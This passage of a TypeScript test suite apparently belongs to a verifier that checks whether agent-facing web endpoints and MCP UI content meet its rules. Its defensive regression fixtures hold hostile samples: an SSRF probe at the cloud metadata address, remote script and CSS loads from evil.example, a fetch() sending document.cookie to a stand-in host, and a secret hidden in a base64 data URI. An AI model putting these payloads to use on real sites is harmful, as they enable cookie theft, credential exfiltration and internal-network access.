    break: (r) => withOverrides(r, { 'GET /llms.txt': () => ({ status: 404, contentType: 'text/plain', body: 'nope' }), 'GET /': () => ({ status: 200, contentType: 'application/json', body: '{}' }) }),
  },
  {
    id: 'agents-json',
    break: (r) => withOverrides(r, { 'GET /.well-known/agents.json': () => ({ status: 200, contentType: 'application/json', body: '{ not json' }) }),
  },
  {
    id: 'icp-json',
    break: (r) => withOverrides(r, { 'GET /icp.json': () => ({ status: 404, contentType: 'application/json', body: '{}' }) }),
  },
  {
    id: 'openapi',
    break: (r) => withOverrides(r, { 'GET /openapi.json': () => ({ status: 404, contentType: 'application/json', body: '{}' }) }),
  },
  {
    id: 'offers-402',
    break: (r) => withOverrides(r, { 'GET /offers/upgrade': () => ({ status: 200, contentType: 'application/json', body: '{"free":true}' }) }),
  },
  {
    id: 'keyless-flow',
    break: (r) => withOverrides(r, {
      'GET /api/status': () => ({ status: 401, contentType: 'application/json', body: '{"error":"unauthorized"}' }),
      'GET /api/widgets': () => ({ status: 401, contentType: 'application/json', body: '{"error":"unauthorized"}' }),
      'GET /api/widgets/{id}': () => ({ status: 401, contentType: 'application/json', body: '{"error":"unauthorized"}' }),
    }),
  },
]

describe('(c) discriminating-fixture invariant — each check genuinely fails a non-compliant target (anti-lockstep, ax-2dd)', () => {
  async function judgeRoutes(routes: Routes) {
    const observer = new Observer({ fetcher: makeFetcher(routes), delayMs: 0 })
    const bundle = await observeTarget(GOOD, observer, 42)
    return runChecks(bundle)
  }

  it('the compliant baseline PASSES every requirement under test (no false fail)', async () => {
    const checks = await judgeRoutes(goodTargetRoutes())
    for (const { id } of DISCRIMINATORS) {
      expect(verdictOf(checks, id), `${id} should PASS on the compliant baseline: ${detailOf(checks, id)}`).toBe('pass')
    }
  })

  for (const { id, break: breakIt } of DISCRIMINATORS) {
    it(`${id}: a KNOWN-NON-COMPLIANT target FAILS the check (verifier discriminates)`, async () => {
      const checks = await judgeRoutes(breakIt(goodTargetRoutes()))
      expect(verdictOf(checks, id), `${id}: ${detailOf(checks, id)}`).toBe('fail')
    })
  }
})

// ===========================================================================
// (d) SESSION-BUG PERMANENT REGRESSION FIXTURES
// ===========================================================================

describe('(d) session-bug regressions — a false pass on any = the fix regressed', () => {
  // ---- ax-6ql: SSRF via monetization.probe (never fetched, offers-402 fails) ----
  it('ax-6ql: a monetization.probe at the metadata IP is never fetched; offers-402 fails closed', async () => {
    const c = baseCard()
    ;(c.monetization as Record<string, unknown>).probe = { method: 'GET', url: 'http://169.254.169.254/latest/meta-data' }
    const { fetcher, calls } = trapFetcher(cardRoutes(c))
    const observer = new Observer({ fetcher, delayMs: 0 })
    const bundle = await observeTarget(GOOD, observer, 42)
    const checks = runChecks(bundle)
    expect(hostsOf(calls).every((h) => h === 'good.example')).toBe(true)
    expect(noSecretLeak(bundle)).toBe(true)
    expect(verdictOf(checks, 'offers-402')).toBe('fail')
  })

  // ---- ax-2dd: lockstep escape — covered structurally by (c); pin one instance ----
  it('ax-2dd: a broken offer boundary does not lockstep-pass offers-402', async () => {
    const routes = withOverrides(goodTargetRoutes(), { 'GET /offers/upgrade': () => ({ status: 200, contentType: 'application/json', body: '{"free":true}' }) })
    const observer = new Observer({ fetcher: makeFetcher(routes), delayMs: 0 })
    const checks = runChecks(await observeTarget(GOOD, observer, 42))
    expect(verdictOf(checks, 'offers-402')).toBe('fail')
  })

  // ---- mcp-ui CSP holes (ax-coz / script-src-elem / island img-media / form-action-base-uri) ----
  it('mcp-ui CSP: remote <script src> srcDoc fails self-containment (not certified safe)', async () => {
    const { checks } = await judgeMcpUi({ srcDoc: `<!doctype html><html><head><script src="https://cdn.evil.example/w.js"></script></head><body>hi</body></html>` })
    expect(verdictOf(checks, 'mcp-ui-self-contained'), detailOf(checks, 'mcp-ui-self-contained')).toBe('fail')
  })

  it('mcp-ui CSP: a remote url() hidden in an inline style="" attribute fails self-containment', async () => {
    const srcDoc = `<!doctype html><html><body><div style="background:url(https://evil.example/x.png)">hi</div><script>${CLEAN_SCRIPT}</script></body></html>`
    const { checks } = await judgeMcpUi({ srcDoc })
    expect(verdictOf(checks, 'mcp-ui-self-contained')).toBe('fail')
  })

  it('mcp-ui CSP: an HTML-entity-obfuscated remote url in CSS is decoded and fails self-containment', async () => {
    const srcDoc = `<!doctype html><html><head><style>@import "&#x68;ttps://evil.example/a.css";</style></head><body><script>${CLEAN_SCRIPT}</script></body></html>`
    const { checks } = await judgeMcpUi({ srcDoc })
    expect(verdictOf(checks, 'mcp-ui-self-contained')).toBe('fail')
  })

  it('mcp-ui CSP: a fetch()/exfil sink to a remote host in an inline <script> fails self-containment', async () => {
    const script = `fetch('https://evil.example/steal?d='+document.cookie)`
    const srcDoc = `<!doctype html><html><body><script>${script}</script></body></html>`
    const { checks } = await judgeMcpUi({ srcDoc, csp: closedCsp(cspScriptHash(script)) })
    expect(verdictOf(checks, 'mcp-ui-self-contained')).toBe('fail')
  })

  it('mcp-ui CSP: script-src-elem hiding \'unsafe-inline\' is caught (effective-policy fold)', async () => {
    const csp = { 'default-src': "'none'", 'script-src': "'sha256-x'", 'script-src-elem': "'unsafe-inline'", 'connect-src': "'self'", 'form-action': "'none'", 'base-uri': "'none'" }
    const { checks } = await judgeMcpUi({ csp })
    expect(verdictOf(checks, 'mcp-ui-self-contained')).toBe('fail')
  })

  it('mcp-ui CSP: a missing form-action/base-uri leaves an un-closed CSP (ax-coz) → self-containment fails', async () => {
    const csp = { 'default-src': "'none'", 'script-src': CLEAN_HASH, 'connect-src': "'self'" } // no form-action / base-uri
    const { checks } = await judgeMcpUi({ csp })
    expect(verdictOf(checks, 'mcp-ui-self-contained'), detailOf(checks, 'mcp-ui-self-contained')).toBe('fail')
  })

  // ---- data-URI laundering (ax-17j / ax-7vu opaque-secret + padded-media) ----
  it('ax-17j: a known secret laundered as data:text/plain;base64 in a model-visible channel is caught', async () => {
    const secret = 'AKIAIOSFODNN7EXAMPLE' // a KNOWN AWS-key-shaped pattern
    const dataUri = `data:text/plain;base64,${Buffer.from(secret).toString('base64')}`
    const { checks } = await judgeMcpUi({ structuredContent: { note: dataUri, count: 3, widgets: [{ id: 'w1' }] } })
    expect(verdictOf(checks, 'mcp-ui-envelope-hygiene'), detailOf(checks, 'mcp-ui-envelope-hygiene')).toBe('fail')
  })

  it('ax-7vu: an opaque secret padded past the size floor under data:image/png does not earn the media exemption', async () => {
    // Deliberately GENERIC opaque high-entropy (mixed-case + digits, dot-free) —
    // NOT a known credential SHAPE (no sk-/AKIA/gh*_/xox*-/ya29./1//… prefix), so
    // it matches NO VALUE_SECRET_PATTERNS entry and is NOT caught by the raw/
    // base64 pattern scan (checks.ts valueSecretLabel) before the media-exemption
    // path runs. That forces this fixture through isMediaBinaryMime + the size
    // floor + mediaBytesMatchMime — the padded payload is NOT real PNG bytes, so
    // ONLY the ax-7vu magic-byte check (mediaBytesMatchMime) denies the media
    // exemption and lets the entropy heuristic catch it. If mediaBytesMatchMime
    // were ever dropped, isMediaBinaryMime('image/png') + the size floor alone
    // would grant the exemption and this would false-PASS.
    const secret = 'aB3fG7hK2mN9pQ4rS8tU1vW6xY0zC5dE2fH7jL4nP9qR3sTz'
    const dataUri = `data:image/png;base64,${Buffer.from(secret + 'B'.repeat(600)).toString('base64')}`
    const { checks } = await judgeMcpUi({ structuredContent: { icon: dataUri, count: 3, widgets: [{ id: 'w1' }] } })
    expect(verdictOf(checks, 'mcp-ui-envelope-hygiene')).toBe('fail')
  })

  // ---- ax-q4t: keyless-detection {result:null} must NOT grant a free OAuth SKIP ----
  // A degenerate unauthenticated POST-initialize (result:null / a primitive / no
  // protocolVersion) must NOT be read as a genuine keyless MCP — otherwise the
  // MCP-OAuth siblings get a free SKIP (the escape). With the fix, a null result
  // is NOT keyless, so the OAuth checks are JUDGED and FAIL (no metadata).
  async function judgeMcpUnauth(initResult: unknown): Promise<ReturnType<typeof runChecks>> {
    const card = baseCard()
    ;(card.interfaces as Record<string, unknown>).mcp = { transport: 'streamable-http', url: `${GOOD}/mcp`, tools: ['list_widgets'] }
    const routes = withOverrides(cardRoutes(card), {
      'GET /mcp': () => ({ status: 405, contentType: 'application/json', body: '{"error":"method not allowed"}' }),
      'POST /mcp': () => ({ status: 200, contentType: 'application/json', body: JSON.stringify({ jsonrpc: '2.0', id: 1, result: initResult }) }),
    })
    const observer = new Observer({ fetcher: makeFetcher(routes), delayMs: 0, allowWrites: true })
    return runChecks(await observeTarget(GOOD, observer, 42))
  }

  it('ax-q4t: a result:null initialize does NOT grant a keyless free-skip; the OAuth check is judged and fails', async () => {
    const checks = await judgeMcpUnauth(null)
    const oauth = verdictOf(checks, 'mcp-oauth-protected-resource')
    expect(oauth, `mcp-oauth-protected-resource=${oauth}: ${detailOf(checks, 'mcp-oauth-protected-resource')}`).toBe('fail')
  })

  it('ax-q4t discrimination: a GENUINE initialize result (protocolVersion) DOES earn the keyless skip', async () => {
    const checks = await judgeMcpUnauth({ protocolVersion: '2025-06-18', capabilities: {}, serverInfo: { name: 'x', version: '1' } })
    const oauth = verdictOf(checks, 'mcp-oauth-protected-resource')
    expect(oauth, `mcp-oauth-protected-resource=${oauth}: ${detailOf(checks, 'mcp-oauth-protected-resource')}`).toBe('skip')
  })

  // ---- ui-stream framing: a stream with no [DONE] terminal must fail (not lockstep-pass) ----
  it('ui-stream: a stream with no [DONE] terminal fails framing (not a false pass)', async () => {
    const body = `data: ${JSON.stringify({ type: 'start' })}\n\ndata: ${JSON.stringify({ type: 'finish' })}\n\n`
    const { checks } = await judgeUiStream(body)
    expect(verdictOf(checks, 'ui-stream-framing'), detailOf(checks, 'ui-stream-framing')).toBe('fail')
  })
})
